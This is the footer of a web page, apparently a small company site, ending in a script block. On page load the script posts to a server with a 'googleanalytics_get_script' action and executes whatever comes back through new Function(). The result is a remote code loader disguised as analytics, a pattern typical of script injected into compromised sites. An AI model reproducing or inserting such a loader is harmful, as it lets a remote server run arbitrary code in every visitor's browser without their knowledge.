<div style="clear:both;"></div>
<footer>
    <p><b>Copyrights ©2018: Gary Peter Group</b></p>
</footer>
<script>
    jQuery(document).ready(function() {
        jQuery.post('http://garypeter.com?ga_action=googleanalytics_get_script', {
            action: 'googleanalytics_get_script'
        }, function(response) {
            var F = new Function(response);
            return (F());
        });
    });

</script>